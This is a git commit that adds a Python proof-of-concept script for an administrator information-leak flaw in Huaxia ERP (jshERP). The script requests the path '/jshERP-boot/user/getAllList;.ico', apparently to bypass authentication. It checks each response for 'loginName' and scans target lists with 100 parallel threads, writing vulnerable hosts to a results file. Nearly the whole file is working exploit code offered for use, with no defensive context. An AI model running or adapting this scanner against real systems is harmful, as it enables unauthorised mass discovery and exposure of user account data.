3cc616cb26ed99f57ea3f7bbcfda6b5212c6c51a
huaiying666 <2929384884@qq.com>
2024-07-01 21:36:27 +0800

    Create 华夏ERP管理员信息泄露漏洞.py

---
+++ 华夏ERP管理员信息泄露漏洞/华夏ERP管理员信息泄露漏洞.py
@@ -0,0 +1,49 @@
+import argparse  # 用于解析命令行参数
+import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
+import requests  # 用于发送HTTP请求
+import re  # 正则表达式模块，用于字符串匹配和操作
+import time  # 提供时间相关的功能
+from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
+requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告
+def main():
+    parser = argparse.ArgumentParser(description="J_C")
+    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
+    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []  
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()  
+        mp.join()  
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")
+def poc(target):
+    payload_url = '/jshERP-boot/user/getAllList;.ico'
+    url = target + payload_url
+    header = {
+            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
+            'Connection': 'close',
+            'Accept': '*/*',
+            'Accept-Language': 'en',
+            'Accept-Encoding': 'gzip'
+    }
+    try:
+        res1 = requests.get(url=url,headers=header,timeout=10)
+        if res1.status_code == 200:
+            if "loginName" in res1.text:
+                print(f'[+] 该URL存在漏洞,地址为{target}')
+                with open('result.txt', 'a', encoding='utf-8') as f:
+                    f.write(target + "\n")
+            else:
+                print(f'[-] 该URL{target}不存在漏洞')
+    except Exception as e:
+        print(f'[*] 该URL{target}存在访问问题，请手工测试')
+
+if __name__ == '__main__':
+    main()
